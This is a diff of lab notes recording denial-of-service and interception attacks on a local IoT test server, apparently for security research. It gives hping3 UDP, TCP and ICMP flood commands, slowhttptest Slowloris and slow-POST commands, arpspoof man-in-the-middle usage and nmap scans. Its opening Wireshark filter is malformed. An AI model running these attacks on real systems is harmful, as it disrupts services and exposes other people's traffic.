@@ -1,3 +1,19 @@
+Wireshark Filter used to monitor all traffic:
+((host SERVER_IP and not host LOCAL_IP and not port 1880) or (port 1883 and not port 1880) or (port 1880 and host (HTTP_DEVICE_IP))or port and(udp or tcp or ip or ip6 or icmp or arp)
+((host SERVER_IP and not host LOCAL_IP and not_port_node-red) or (port_MQTT and not port_Node_red) or (port Node_red and host (HTTP_DEVICE_IP)) and(udp or tcp or ip or ip6 or icmp or arp)
+////////////////////////////////////////////DDoS//////////////////////////////////////////////
+////////////////////////////////////////////FLOOD ATTACKS PERFORMED///////////////
+
+UDP FLOOD:
+
+Sends UDP packets to the following host on Port 5683 corresponding to coAp server, denying completly communication from device and server
+Different speed were tested
+
+//flood-countless packets are sent
+sudo hping3 -S --flood -p 5683 --udp 192.168.1.5
+//faster - 100 packets per second are sent
+sudo hping3 -S --faster -p 5683 --udp 192.168.1.5
+//fast- 10 packets per second are sent
 sudo hping3 -S --fast  -p 5683 --udp 192.168.1.5
 
 TCP FLOOD to no Port:
@@ -42,7 +58,7 @@ Connection rate is 200 connections per second.
 interval between follow up data for this test is 10 bytes
 Maximum length of follow up data is random value limited by 300 bytes
 Probe connections waits 3 seconds for HTTP response before marking server as DoSed:
-
+SlowHTTP_test
 slowhttptest -B -c 1000 -g -o output -i 10 -r 200 -t POST -u http://192.168.1.5:1880/dht11_t -x 300 -p 3
 slowhttptest -B -c 1000 -g -o output -i 10 -r 200 -t POST -u http://192.168.1.5:1880/dht11_h -x 300 -p 3
 slowhttptest -B -c 1000 -g -o output -i 10 -r 200 -t POST -u http://192.168.1.5:1880/ds18b20 -x 300 -p 3
@@ -53,4 +69,32 @@ Start a slowloris test starting with 1000 connections,
 Connection rate is 200 connections per second.
 interval between follow up data for this test is 10 bytes
 Maximum length of follow up data for slowloris is 300 bytes
-Probe connections waits 3 seconds for HTTP response before marking server as DoSed:
+Probe connections waits 3 seconds for HTTP response before marking server as DoSed
+
+slowhttptest -H -c 2000 -g -o output -i 10 -r 200 -t GET -u http://192.168.1.5:1880/check -x 300 -p 3
+
+BOTNET ATTACK
+Using 3 NodeMCU microcontrollers outsiders to perform maliscious post messages truough HTTP to the server on PORT 1880 ,that is an endpoint for the HTTP to connect to 
+
+ICMP flood
+It was used ICMP protocol to flood the server with ping requests of diverse types, this way affecting the system with enormous quantity of pings
+sudo hping3 --icmp  -I eth0  192.168.1.5 --faster
+sudo hping3 --icmp --force-icmp -I eth0  192.168.1.5 --fast
+
+
+-Man In the Middle
+TOOL: dsniff
+---Arp spoofing
+
+ARP is a internet protocol that manipulate addresses of internet devices, in this particular case tt is responsible for forging a MAC address and making its association based on its IP local Network. 
+Both server and Network router update their ARP cache for atacker the attacker correspondation address and start communicating also with the attacker device address that is disguided as both Router and server in the same Network Interface. This way It can spy and intercept messages of both server and router. this way intercepts IoT devices communication to its server and vice versa.
+For server arp address table ,the spying device is the same  MAC as the router.
+For router arp address table ,the spying device is the same  MAC as the server
+arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]
+
+--Port information
+Get all the ports that are up and its used service
+This method is used for scanning UDP Ports
+sudo nmap -sU 192.168.1.5  
+   
+sudo nmap -sV 192.168.1.5
